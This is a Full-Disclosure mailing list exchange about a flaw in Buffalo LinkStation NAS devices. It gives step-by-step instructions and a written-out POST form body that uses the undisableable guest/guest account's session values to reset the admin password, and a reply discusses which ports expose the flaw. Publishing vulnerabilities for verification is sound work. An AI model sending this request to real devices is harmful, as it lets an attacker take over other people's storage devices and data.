Hi List,

just checked something out. please verifiy:


A guest user is always enabled and can NOT be disabled.

A guest user gets a GSSS and a GRRR Session value assigned when logging on

To Reset the admin password do the following:

1. Login with guest/guest
2. Get the Valid GSSS and GRRR from the source
3. Send a post request with the following form to the buffalo:

hiddenPageId=user_add&txtUserEditName=admin&txtUserEditOldName=admin&txtUserEditPassword1st=hacked&txtUserEditPassword2nd=hacked&txtUserEditComment=hacked&rdoUserEditQuota=off&hiddenUserEditNameOld=admin&txtHelpSearch=&gPage=user&gMode=setup&gType=undefined&gKey=undefined&gSSS=<YOUR GUEST GSSS HERE>&gRRR=<YOUR GUEST GRRR HERE>&hiddenDummyText=dummy


Take care that the UserEditComment contains no special chars...

Thats it, Admin password reseted as Guest user. 

Who needs permissions anyway.


Please let me know if this works for you, too.

Andre

Betreff: Re: [Full-disclosure] Buffalo Technology LinkStation Information Disclosure And Privilege Escalation

At least in my tests (on different LinkStations), the URIs only work
from the networks where admin has been authorized, using the admin port
(typically 80). I.e. typically wired LAN only. Still a very serious
problem (exposing passwords and private key), but not an issue for
WebAccess, since it uses another port and provides a different view of
the system. I.e. the URIs do not work over the WebAccess connection at
least on the LinkStations I tested. 

Can you confirm? It seems that you have the admin interface open to the
WAN. At least judging from the fact that the URIs used port 80, which is
the one for the admin interface, not for WebAccess.
